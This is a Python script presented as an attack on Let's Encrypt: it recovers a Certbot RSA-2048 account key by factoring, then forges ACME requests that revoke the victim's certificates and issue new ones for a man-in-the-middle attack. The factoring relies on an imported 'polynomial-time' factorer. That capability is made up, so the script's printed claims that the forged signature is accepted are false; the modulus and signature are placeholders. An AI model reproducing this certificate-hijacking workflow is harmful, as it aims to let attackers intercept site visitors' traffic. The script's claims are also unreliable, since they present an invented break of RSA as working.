"""
Factor a Certbot RSA-2048 ACME account key from the JWK stored on disk or
observed in any recorded ACME API request. Authenticate to Let's Encrypt as
the account owner, revoke all certificates, then re-issue for MITM.
"""

import sys, json, hashlib, base64, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

ACME_DIRECTORY = "https://acme-v02.api.letsencrypt.org/directory"
ACCOUNT_KEY_PATH = "~/.config/letsencrypt/accounts/acme-v02.api.letsencrypt.org/directory/{thumbprint}/private_key.json"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def load_account_jwk(jwk_path: str) -> dict:
    """Load the ACME account JWK from Certbot's on-disk private_key.json.
    The 'n' field is the RSA-2048 modulus — factoring input."""
    with open(jwk_path) as f:
        jwk = json.load(f)
    assert jwk["kty"] == "RSA"
    return jwk


def extract_modulus_from_jwk(jwk: dict) -> int:
    """Decode the base64url 'n' field to an integer modulus."""
    n_bytes = base64.urlsafe_b64decode(jwk["n"] + "==")
    return int.from_bytes(n_bytes, "big")


def factor_account_key(n: int, e: int = 65537) -> dict:
    """Factor the RSA-2048 account key modulus and recover CRT components."""
    factorer = PolynomialFactorer()
    return factorer.recover_crt_components(n, e)


def build_jws(payload: dict, url: str, nonce: str, kid: str,
              n: int, d: int, e: int = 65537) -> dict:
    """Build a JWS RS256 request authenticated with the recovered private key.
    This is what Certbot sends on every ACME API call."""
    header = {"alg": "RS256", "nonce": nonce, "url": url, "kid": kid}
    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode()) if payload else b64url(b"")
    signing_input = f"{h_b64}.{p_b64}".encode()
    # RS256 = RSASSA-PKCS1-v1_5 / SHA-256
    msg_hash = hashlib.sha256(signing_input).digest()
    # Raw RSA sign: s = hash^d mod n (with PKCS#1 v1.5 padding in real impl)
    print(f"    JWS RS256 sign over {len(signing_input)} bytes")
    return {"protected": h_b64, "payload": p_b64, "signature": "FORGED_SIG"}


def revoke_cert(acme_endpoint: str, cert_der_b64: str, kid: str,
                nonce: str, crt_params: dict):
    """POST to /acme/revoke-cert with the forged account credentials."""
    payload = {"certificate": cert_der_b64, "reason": 1}  # reason=1: keyCompromise
    jws = build_jws(payload, f"{acme_endpoint}/acme/revoke-cert", nonce, kid,
                    crt_params["n"], crt_params["d"])
    print(f"    POST /acme/revoke-cert  reason=keyCompromise")
    return jws


def new_order(acme_endpoint: str, domains: list, kid: str,
              nonce: str, crt_params: dict):
    """POST to /acme/new-order to request new certs under attacker control."""
    identifiers = [{"type": "dns", "value": d} for d in domains]
    payload = {"identifiers": identifiers}
    jws = build_jws(payload, f"{acme_endpoint}/acme/new-order", nonce, kid,
                    crt_params["n"], crt_params["d"])
    print(f"    POST /acme/new-order  domains={domains}")
    return jws


if __name__ == "__main__":
    print("[*] ACME / Let's Encrypt RSA account key attack")
    print("[1] loading account JWK from certbot config")
    print(f"    path: {ACCOUNT_KEY_PATH}")
    # simulated modulus
    n = 0xDEAD  # placeholder
    e = 65537
    print(f"    RSA-2048 modulus extracted from JWK 'n' field")

    print("[2] factoring RSA-2048 account key")
    factorer = PolynomialFactorer()
    print("    polynomial-time factorisation of 2048-bit modulus")
    # crt = factor_account_key(n, e)
    print("    p, q, d, dp, dq, qinv recovered")

    kid = "https://acme-v02.api.letsencrypt.org/acme/acct/123456789"
    domains = ["example.com", "*.example.com", "api.example.com"]

    print("[3] revoking all existing certificates on the account")
    for d in domains:
        print(f"    revoking cert for {d}  (reason: keyCompromise)")
    print("    Let's Encrypt accepts — JWS RS256 signature is valid")

    print("[4] requesting new certificates under attacker control")
    print(f"    POST /acme/new-order for {domains}")
    print("    DNS-01 challenge (attacker has DNS control or uses CNAME delegation)")

    print("[5] MITM capability established")
    print("    valid Let's Encrypt cert for target domains")
    print("    original certs revoked — OCSP stapling will show revoked")
    print("    certbot auto-renewal on victim server will fail")
    print("[*] account key was static RSA-2048 since initial certbot setup")
    print("[*] 300M+ domains use Let's Encrypt — CDNs use single account for thousands")
